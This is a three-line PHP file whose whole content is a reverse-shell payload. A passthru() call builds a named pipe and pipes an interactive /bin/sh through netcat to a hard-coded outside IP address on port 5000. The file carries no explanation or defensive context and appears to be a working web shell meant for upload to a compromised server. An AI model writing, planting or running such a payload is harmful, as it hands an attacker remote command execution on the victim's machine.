<?php
passthru("rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1 | nc 18.191.62.122 5000 > /tmp/h");
?>